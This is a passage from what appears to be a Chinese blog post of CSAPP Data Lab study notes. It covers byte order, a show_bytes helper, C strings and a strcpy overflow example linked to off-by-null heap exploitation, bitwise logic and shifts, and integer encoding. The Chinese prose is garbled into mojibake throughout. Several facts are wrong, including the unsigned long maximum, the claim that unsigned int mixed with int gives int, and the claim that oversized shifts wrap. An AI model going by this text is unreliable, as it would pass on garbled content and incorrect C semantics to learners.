çš„åœ°å€åªéœ€è¦ç¡®å®šå®ƒçš„æœ€é«˜å­—èŠ‚çš„ä½ç½®å³å¯ç¡®å®šæ•´ä¸ª <code>int</code> çš„ä½ç½®ã€‚å‡å¦‚ <code>int</code> çš„åœ°å€æ˜¯åœ¨ <code>0x100</code> çš„ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥æ€ä¹ˆæ’åˆ—è¿™äº›å­—èŠ‚å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æœ€åˆå¯èƒ½æŒ‰ç…§æƒ¯æ€§ï¼Œè®¤ä¸ºå®ƒæ˜¯æŒ‰ç…§å¦‚ä¸‹æ–¹å¼å­˜å‚¨çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å­—èŠ‚ï¼š12  34  56  78</span><br><span class="line">åœ°å€ï¼š100 101 102 103</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹Ÿå¾ˆç¬¦åˆæˆ‘ä»¬çš„ä¹¦å†™è§„åˆ™ï¼Œä½†æ˜¯å®æ—¶å´æ°æ°ç›¸åï¼Œåœ¨ç°åœ¨å¤§éƒ¨åˆ†çš„æœºå™¨ä¸­ï¼Œå®ƒæ˜¯åç€å­˜å‚¨çš„ã€‚ä¹Ÿå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å­—èŠ‚ï¼š78  56  34  12</span><br><span class="line">åœ°å€ï¼š100 101 102 103</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§å­˜å‚¨æ–¹å¼æˆ‘ä»¬åˆ†åˆ«å«å¤§ç«¯åºå’Œå°ç«¯åºã€‚</p><ul><li><p>å¤§ç«¯åºï¼šæœ€é«˜æœ‰æ•ˆå­—èŠ‚åœ¨ä½åœ°å€</p></li><li><p>å°ç«¯åºï¼šæœ€é«˜æœ‰æ•ˆå­—èŠ‚åœ¨é«˜åœ°å€</p></li></ul><p>åœ¨æˆ‘ä»¬ä¹¦å†™æ±‡ç¼–è¯­è¨€çš„æ—¶å€™ï¼Œè¦å†™ä¸€ä¸ªå€¼é€šå¸¸ä¹Ÿæ˜¯ä»¥å°ç«¯åºçš„æ–¹å¼ä¹¦å†™çš„ã€‚</p><p>æ¯”å¦‚æˆ‘ç»™ <code>eax</code> å¯„å­˜å™¨åŠ ä¸Š <code>0x12345678</code> ä½ ä¼šå‘ç°å®ƒçš„å­—èŠ‚ç æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x12345678,%eax </span><br><span class="line">b8 78 56 34 12</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡å®šä¹‰ä»¥ä¸‹çš„å‡½æ•°ä»¥åå…­è¿›åˆ¶æ¥é€ä¸ªæ˜¾ç¤ºå†…å­˜ä¸­çš„å­—èŠ‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>start</code> å‚æ•°ä¸ºè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œ<code>len</code> å‚æ•°ä¸ºæ˜¾ç¤ºçš„å­—èŠ‚æ•°ï¼Œå¯ä»¥ä»»æ„å®šä¹‰å˜é‡è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥æŸ¥çœ‹è¿™ä¸ªå¯¹è±¡åœ¨å†…å­˜ä¸­çš„æ’å¸ƒï¼Œç†è§£æµ®ç‚¹æ•°çš„æ—¶å€™è¿™ä¸ªå‡½æ•°éå¸¸æœ‰ç”¨ã€‚</p><p>æ¥æŸ¥çœ‹ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0x3039</span>;</span><br><span class="line">    show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">float</span> y=x;</span><br><span class="line">    show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æµ®ç‚¹æ•°çš„è¾“å‡ºåœ¨æ•´æ•°å½¢æ€ä¸‹ä¸º <code>0x4640E400</code>ã€‚ä¸æ•´æ•°çš„å­˜å‚¨æœ‰ç€æˆªç„¶ä¸åŒçš„ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹è¿™ä¸ªç»“æœçš„äºŒè¿›åˆ¶é€‚å½“ç§»ä½å°±ä¼šå‘ç°å®ƒä»¬æœ‰13ä¸ªç›¸åŒ¹é…çš„ä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  0   0   0   0   3   0   3   9</span><br><span class="line">0000000000000000001000000111001</span><br><span class="line">            4   6   4   0   E   4   0   0</span><br><span class="line">         01000110010000001110010000000000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°13ä¸ªä½åˆšå¥½å°±æ˜¯ <code>int</code> å½¢å¼ä¸‹çš„ä½ <code>13</code> ä½ï¼Œè¿™å¹¶ä¸æ˜¯å·§åˆï¼Œå¤§å®¶å¯ä»¥è¯•è¯•çœ‹å…¶å®ƒæ•°ï¼Œå¹¶ä¸”å¯ä»¥çœ‹çœ‹å®ƒæœ€å¤šèƒ½åŒ¹é…å¤šå°‘ä½çš„æ•´æ•°ï¼Œä½†æ˜¯è¦æ³¨æ„ç»“è®ºéœ€è¦æœ‰ä¸€èˆ¬æ€§ï¼Œç‰¹æ®Šçš„æ•°å­—ç¬¦åˆå¹¶ä¸èƒ½å¾—å‡ºä»€ä¹ˆç»“è®ºï¼Œåªèƒ½è¯´æ˜¯ç‰¹æ€§ã€‚</p><h3 id="è¡¨ç¤ºå­—ç¬¦ä¸²"><a href="#è¡¨ç¤ºå­—ç¬¦ä¸²" class="headerlink" title="è¡¨ç¤ºå­—ç¬¦ä¸²"></a>è¡¨ç¤ºå­—ç¬¦ä¸²</h3><p>å­—ç¬¦ä¸²çš„å®šä¹‰å°±æ˜¯ä¸€ä¸ªä»¥ <code>null</code> å­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼Œå¦‚æœå°†å­—ç¬¦ä¸²çœ‹æˆä¸€ä¸ªæ•°æ®ç±»å‹çš„è¯ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä»¥å¤§ç«¯å½¢å¼å­˜å‚¨çš„ï¼Œä½†æ˜¯å…¶å®å®é™…ä¸Šåº”è¯¥è¯´æ˜¯æ•°ç»„æ˜¯å¤§ç«¯å­˜å‚¨çš„ã€‚æˆ‘ä»¬åœ¨ä¹¦å†™çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¸‹æ ‡ <code>0 </code>æ˜¯æœ€å°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹ æƒ¯æŠŠå®ƒç§°ä¸ºé«˜ä½ï¼Œé«˜ä½åœ¨ä½åœ°å€ä¾¿æ˜¯å¤§ç«¯åºã€‚æ¯”å¦‚ <code>char s[]=&quot;1234&quot;;</code> é‚£ä¹ˆ <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=4,s[4]=NULL</code>ã€‚è¯·æ³¨æ„æœ«å°¾çš„ç©ºå­—èŠ‚ä¹Ÿä¼šåŒ…æ‹¬åœ¨å­—ç¬¦ä¸²é‡Œé¢ï¼Œä½†æ˜¯æˆ‘ä»¬ç®—é•¿åº¦ä¸ä¼šç®—ä¸Šè¿™ä¸ªå­—èŠ‚ã€‚åœ¨ <code>gcc</code> ç¼–è¯‘å™¨ä¸­ï¼Œæˆ‘ä»¬ç¼–è¯‘å¦‚ä¸‹çš„ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šå‘å‡ºå¯èƒ½å­˜åœ¨æº¢å‡ºçš„è­¦å‘Šï¼Œå› ä¸ºåœ¨æ‹·è´çš„æ—¶å€™ä¼šå¤šæºå¸¦ä¸€ä¸ª <code>0</code> å­—èŠ‚è¿‡æ¥ï¼Œè¿™åœ¨åé¢å †åˆ©ç”¨ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ <code>off by null</code> çš„æ‰‹æ®µã€‚</p><p>å†æ¯”å¦‚æˆ‘ä»¬ç”¨è¿™æ ·çš„æ–¹å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> s[]=<span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="keyword">sizeof</span>(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°è¿™ä¸ª <code>char</code> æ•°ç»„å ç”¨äº† <code>17</code> ä¸ªå­—èŠ‚çš„ç©ºé—´ã€‚</p><h3 id="å¸ƒå°”ä»£æ•°ç®€ä»‹"><a href="#å¸ƒå°”ä»£æ•°ç®€ä»‹" class="headerlink" title="å¸ƒå°”ä»£æ•°ç®€ä»‹"></a>å¸ƒå°”ä»£æ•°ç®€ä»‹</h3><p>å¸ƒå°”ä»£æ•°æ˜¯ä¸€ä¸ªå»ºç«‹åœ¨äºŒå…ƒé›†åˆé›†åˆ <code>G=&#123;0,1&#125;</code> ä¸Šçš„å®šä¹‰ã€‚</p><h4 id="é"><a href="#é" class="headerlink" title="é"></a>é</h4><blockquote><p>é0å³ä¸º1ï¼Œéé0å³ä¸º0ã€‚</p></blockquote><h4 id="ä¸"><a href="#ä¸" class="headerlink" title="ä¸"></a>ä¸</h4><blockquote><p>å…¨1ä¸º1ï¼Œä¸å…¨1ä¸º0</p></blockquote><h4 id="æˆ–"><a href="#æˆ–" class="headerlink" title="æˆ–"></a>æˆ–</h4><blockquote><p>å…¨0ä¸º0ï¼Œä¸å…¨0ä¸º1</p></blockquote><h4 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h4><blockquote><p>ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1</p></blockquote><hr><h4 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h4><ol><li>é0ä¸º1ï¼Œé1ä¸º0</li><li>1ä¸1ä¸º1ï¼Œ1ä¸0ä¸º0ï¼Œ0ä¸1ä¸º0ï¼Œ0ä¸0ä¸º0</li><li>1æˆ–1ä¸º1ï¼Œ1æˆ–0ä¸º1ï¼Œ0æˆ–1ä¸º1ï¼Œ0æˆ–0ä¸º0</li><li>1å¼‚æˆ–1ä¸º0ï¼Œ1å¼‚æˆ–0ä¸º1ï¼Œ0å¼‚æˆ–1ä¸º1ï¼Œ0å¼‚æˆ–0ä¸º0</li></ol><p>åœ¨Cè¯­è¨€ä¸­ä¹Ÿæœ‰ä¸€ä¸ªç±»å‹æ˜¯ <code>bool</code>ï¼Œå®ƒä»¬æœ‰ç‰¹æ®Šçš„è¿ç®—ç¬¦ï¼š</p><ul><li>ä¸ï¼š&amp;&amp;</li><li>æˆ–ï¼š||</li><li>éï¼š!</li></ul><p>ä¸ä¸€æ ·çš„æ˜¯ï¼Œåœ¨è¿›è¡Œè¿™äº›è¿ç®—çš„æ—¶å€™ï¼Œç»Ÿç»Ÿä¼šæŠŠå‚ä¸è¿ç®—çš„å€¼è½¬ä¸º <code>bool</code> ç±»å‹ï¼Œ<code>0</code> å°±æ˜¯ <code>0</code>ï¼Œä¸æ˜¯ <code>0</code> ä¸€å¾‹éƒ½æ˜¯ <code>1</code></p><h3 id="Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—"><a href="#Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—" class="headerlink" title="Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—"></a>Cè¯­è¨€å½“ä¸­çš„ä½çº§è¿ç®—</h3><h4 id="ä½é€»è¾‘è¿ç®—"><a href="#ä½é€»è¾‘è¿ç®—" class="headerlink" title="ä½é€»è¾‘è¿ç®—"></a>ä½é€»è¾‘è¿ç®—</h4><p>æˆ‘ä»¬å¹³æ—¶Cè¯­è¨€çš„ä½è¿ç®—ä¼šæ‰©å±•åˆ°æ¯ä¸€ä½ï¼Œä½ä¹‹é—´ç‹¬ç«‹åœ°è¿ç®—ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ•´æ•°(int)è§†ä¸º32ç»´çš„å‘é‡ï¼Œæ¯ä¸ªç»´åº¦ä¸º0æˆ–è€…1ï¼Œå¯¹æ•´æ•°è¿›è¡Œä½é€»è¾‘è¿ç®—ç›¸å½“äºæ¯ä¸€ä½åˆ†åˆ«åšé€»è¾‘è¿ç®—ï¼Œæ¯ä¸€ä½ç»“æœä¸ºæ–°å‘é‡å¯¹åº”ä½çš„ç»“æœã€‚åœ¨ <code>C</code> è¯­è¨€ä¸­ï¼Œä»¥ä¸Šé€»è¾‘è¿ç®—å¯¹åº”çš„ç¬¦å·åˆ†åˆ«ä¸ºï¼š</p><ul><li>éï¼š~</li><li>ä¸ï¼š&amp;</li><li>æˆ–ï¼š|</li><li>å¼‚æˆ–ï¼š^</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨åªæ‹¥æœ‰éå’Œå…¶å®ƒä»»æ„ä¸€ä¸ªåŒç›®è¿ç®—æ¥å®ç°æ‰€æœ‰çš„ä½é€»è¾‘è¿ç®—ã€‚</p><p>æ¯”å¦‚æˆ‘ä¸ç”¨å¼‚æˆ–å®ç°å¼‚æˆ–çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±æ˜¯ï¼š</p><p>ä¸€ä¸ªä¸º <code>1</code>ï¼Œä¸€ä¸ªä¸º <code>0</code> é‚£ä¹ˆä¸ºæˆ–è€…ä¸€ä¸ªä¸º <code>0</code>ï¼Œä¸€ä¸ªä¸º <code>1</code> çš„æƒ…å†µéƒ½æ˜¯ <code>1</code>ï¼Œå…¶ä½™éƒ½æ˜¯ <code>0</code>ã€‚æˆ‘ä»¬çŸ¥é“ä¸çš„ç‰¹æ€§å°±æ˜¯åªæœ‰å…¨ <code>1</code> çš„æ—¶å€™ä¸º <code>0</code>ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘å…¶ä¸­ä¸€ä¸ªå–éäº†ï¼Œå†ä¸è¿˜æ˜¯1çš„è¯å°±è¯´æ˜ä¸€ä¸ªä¸º <code>1</code> ä¸€ä¸ªä¸º <code>0</code> äº†ï¼Œä¸¤è¾¹éƒ½éä¸€ä¸‹ï¼Œæœ€åæŠŠç¬¦åˆæ¡ä»¶çš„ä½æˆ–ä¸€ä¸‹å°±èƒ½å¾—åˆ°å¼‚æˆ–çš„ç»“æœäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xor</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (~x&amp;y)|(x&amp;~y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¸å’Œæˆ–ï¼ŒæŠŠéè¿ç”¨åˆ°ä½äº†å®ƒä»¬ä¸¤ä¸ªä¹Ÿèƒ½è¿ç”¨è‡ªå¦‚è‡ªç”±è½¬æ¢ã€‚</p><p>æ¯”å¦‚æˆ‘ç”¨ä¸å’Œéå®ç°æˆ–ï¼Œé¦–å…ˆæˆ‘å¯¹ä¸¤ä¸ªå…ƒç´ éƒ½éä¸€ä¸‹ç„¶åä¸èµ·æ¥ï¼Œæ˜¯ä¸æ˜¯å°±å˜æˆäº†ï¼š</p><p>å…¨ <code>0</code> ä¸º <code>1</code>ï¼Œå…¶ä½™ä¸º <code>0</code> äº†ï¼Œè¿™å’Œæˆ–çš„å…¨ <code>0</code> ä¸º <code>0</code>ï¼Œå…¶ä½™ä¸º <code>1</code> å·®äº†ä»€ä¹ˆï¼Ÿå¾ˆæ˜¾ç„¶ç»“æœåäº†ï¼Œé‚£ä¹ˆæˆ‘å°±å¯¹ç»“æœå†éä¸€ä¸‹ï¼Œæœ€åå°±å˜æˆäº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">or</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x&amp;~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–å’Œéå®ç°ä¸è¿ç®—åŒç†ã€‚</p><h4 id="ç§»ä½è¿ç®—"><a href="#ç§»ä½è¿ç®—" class="headerlink" title="ç§»ä½è¿ç®—"></a>ç§»ä½è¿ç®—</h4><p>è¿™é‡Œåˆ†é€»è¾‘ç§»ä½å’Œç®—æ•°ç§»ä½ï¼Œå…¶å®å·®ä¸å¤šï¼Œåªä¸è¿‡é€»è¾‘ç§»ä½é€‚ç”¨æ— ç¬¦å·æ•´æ•°ï¼Œç®—æ•°ç§»ä½é€‚ç”¨æœ‰ç¬¦å·æ•´æ•°ã€‚</p><p>åˆ†å·¦ç§»å’Œå³ç§»ï¼Œåˆ†åˆ«ç”¨ç¬¦å· <code>&lt;&lt;</code> å’Œ <code>&gt;&gt;</code> æ¥è¡¨ç¤ºï¼Œå‡è®¾æ•´æ•°ä¸€å…± <code>w</code> ä½ï¼Œå³ç§» <code>n</code> ä½è¡¨ç¤ºä¸¢å¼ƒä½ <code>n</code> ä½ï¼ŒåŸæ¥çš„é«˜<code>w-n</code> ä½å˜ä¸ºä½ <code>w-n</code> ä½ï¼Œé«˜ <code>n</code> ä½å˜ä¸º0ã€‚å·¦ç§» <code>n</code> ä½è¡¨ç¤ºä¸¢å¼ƒé«˜ <code>n</code> ä½ï¼ŒåŸæ¥çš„ä½ <code>w-n</code> ä½å˜ä¸ºé«˜ <code>w-n</code> ä½ï¼Œä½ <code>n</code> ä½å˜ä¸º0ã€‚</p><h5 id="é€»è¾‘ç§»ä½"><a href="#é€»è¾‘ç§»ä½" class="headerlink" title="é€»è¾‘ç§»ä½"></a>é€»è¾‘ç§»ä½</h5><p>å·¦ç§»å³ç§»å°±æ˜¯å­—é¢æ„æ€</p><h5 id="ç®—æ•°ç§»ä½"><a href="#ç®—æ•°ç§»ä½" class="headerlink" title="ç®—æ•°ç§»ä½"></a>ç®—æ•°ç§»ä½</h5><p>æ­£æ•°ä¸é€»è¾‘ç§»ä½ä¸€æ ·ï¼Œè´Ÿæ•°åˆ™ä¼šåœ¨å³ç§»çš„æ—¶å€™é«˜ä½æ·»1.</p><hr><p>å·¦ç§»xç›¸å½“äºå¯¹è¯¥æ•°ä¹˜ <code>2</code> çš„ <code>x</code> æ¬¡æ–¹ï¼Œå³ç§»ç›¸å½“äºå¯¹è¯¥æ•°é™¤ <code>2</code> çš„ <code>x</code> æ¬¡æ–¹å–æ•´ã€‚</p><p>å½“ç§»ä½çš„ä½æ•°å¤§äºç­‰äºè¯¥æ•´æ•°çš„æœ€å¤§ä½æ•°ï¼Œåˆ™ä¼šå–æ¨¡å†ç§»ä½ã€‚</p><h3 id="æ•´æ•°è¡¨ç¤º"><a href="#æ•´æ•°è¡¨ç¤º" class="headerlink" title="æ•´æ•°è¡¨ç¤º"></a>æ•´æ•°è¡¨ç¤º</h3><p>æ•´æ•°æˆ‘ä»¬ä¹‹å‰è®²è¿‡äº†å®ƒçš„å­—èŠ‚æ’å¸ƒè§„å¾‹ï¼Œä½†æ˜¯å¯¹äºè´Ÿæ•°è®¡ç®—æœºåˆå°†å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ</p><h4 id="æ•´æ•°æ•°æ®ç±»å‹"><a href="#æ•´æ•°æ•°æ®ç±»å‹" class="headerlink" title="æ•´æ•°æ•°æ®ç±»å‹"></a>æ•´æ•°æ•°æ®ç±»å‹</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€å¼ è¡¨æ ¼</p><table><thead><tr><th>Cå®šä¹‰</th><th>æœ€å°å€¼</th><th>æœ€å¤§å€¼</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808</td><td>9223372036854775807</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°ï¼Œæœ‰ç¬¦å·æ•°åœ¨æ­£æ•°å’Œè´Ÿæ•°çš„èŒƒå›´å¹¶ä¸ä¸¥æ ¼å¯¹ç§°ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹ã€‚</p><h4 id="æ— ç¬¦å·æ•°çš„ç¼–ç "><a href="#æ— ç¬¦å·æ•°çš„ç¼–ç " class="headerlink" title="æ— ç¬¦å·æ•°çš„ç¼–ç "></a>æ— ç¬¦å·æ•°çš„ç¼–ç </h4><p>æ— ç¬¦å·æ•°çš„ç¼–ç å°±æ˜¯ç”¨ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å‘é‡æ¥è¡¨ç¤ºï¼Œæ¯ä¸ªç»´åº¦ä¸Šçš„å€¼å– <code>0</code> æˆ–è€… <code>1</code>ï¼Œé‚£ä¹ˆæœ‰</p><p><img src="/2022/06/03/CSAPP_Datalab/3.png" alt="3"></p><p>è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å®¹æ˜“ç†è§£çš„ã€‚</p><h4 id="è¡¥ç ç¼–ç "><a href="#è¡¥ç ç¼–ç " class="headerlink" title="è¡¥ç ç¼–ç "></a>è¡¥ç ç¼–ç </h4><p>æœ‰ç¬¦å·æ•°å› ä¸ºéœ€è¦è¡¨ç¤ºè´Ÿæ•°ï¼Œå› æ­¤å®ƒè§„å®šï¼šæœ€é«˜ä½çš„æƒå€¼ä¸ºè´Ÿã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´è‹¥æœ€é«˜ä½ä¸º1ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç­‰æ¯”æ•°åˆ— <code>ai=2^i</code> ä¸­ï¼Œæ•°åˆ—çš„å‰né¡¹å’Œæ°¸è¿œæ¯”ç¬¬ <code>n+1</code> é¡¹å° <code>1</code>ï¼Œæ ¹æ®ç­‰æ¯”æ•°åˆ—å‰ <code>n</code> é¡¹å’Œçš„å…¬å¼ã€‚å› æ­¤è‹¥æœ€é«˜ä½ä¸º1ï¼Œé‚£ä¹ˆå…¶å®ƒä½ä¸ç®¡æ˜¯æ˜¯æ€æ ·éƒ½ä¸ä¼šä½¿è¿™ä¸ªæ•°å˜ä¸ºä¸€ä¸ªæ­£æ•°ã€‚è€Œå‰ <code>n-1</code> é¡¹å¯ä»¥è¡¨ç¤º <code>0~2^n-1</code> çš„èŒƒå›´ï¼Œæ‰€ä»¥è´Ÿæ•°çš„èŒƒå›´å°±æ˜¯<code>-2^n+0~-2^n+2^n-1</code> ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„ <code>-2^n~-1</code> å†åŠ ä¸Šæ­£æ•°è¡¨ç¤ºçš„ <code>0~2^n-1</code> è¿èµ·æ¥çš„èŒƒå›´å°±æ˜¯ <code>-2^n~2^n-1</code> å•¦ã€‚</p><h4 id="æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢"><a href="#æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢"></a>æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢</h4><p>éšå¼è½¬æ¢æŒ‰é¡ºåºéµä»ä»¥ä¸‹åŸåˆ™ï¼š</p><ol><li>æµ®ç‚¹æ•°å‚ä¸è¿ç®—å°±æ˜¯æµ®ç‚¹æ•°ï¼Œå‡ºç°è¿‡doubleåˆ™ç»“æœä¸€å®šä¸ºdouble</li><li>è‹¥éƒ½æ˜¯æ•´æ•°å‚ä¸è¿ç®—åˆ™ç»“æœä¹Ÿæ˜¯æ•´æ•°</li><li>æ•´æ•°è¿ç®—çš„ç»“æœä¸ºå‡ºç°è¿‡çš„ä½æ•°æœ€å¤§çš„æ•´æ•°ï¼Œè‹¥æœ€å¤§çš„æ•´æ•°ä¸­æœ‰æ— ç¬¦å·ç±»å‹çš„åˆ™ç»“æœæ— ç¬¦å·ã€‚</li></ol><p>å› æ­¤ï¼Œå¦‚æœ</p><ul><li>è¿ç®—ä¸­æœ‰ <code>unsigned short</code> å’Œ <code>int</code> åˆ™ç»“æœä¸º <code>int</code>ã€‚</li><li>è¿ç®—ä¸­æœ‰ <code>unsigned int</code> å’Œ <code>int</code> åˆ™ç»“æœä¸º <code>int</code>ã€‚</li><li>è¿ç®—ä¸­æœ‰ <code>unsigned int</code> å’Œ <code>float</code> åˆ™ç»“æœä¸º <code>float</code>ã€‚</li></ul><p>ä¹Ÿå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚</p><p>æœ‰ç¬¦å·ä¸æ— ç¬¦å·çš„ä½äºåŒºåˆ«å°±æ˜¯æœ€é«˜ä½çš„æƒå€¼æ­£è´Ÿé—®é¢˜ï¼Œæ¯”è¾ƒçš„æ—¶å€™ä»»æ„ä¸€æ–¹å‡ºç°æ— ç¬¦å·åˆ™å¦ä¸€æ–¹ä¹Ÿä¼šå˜æˆæ— ç¬¦å·æ¯”è¾ƒï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åšä»¥ä¸‹è¿ç®—ï¼š</p><figure class="highlight 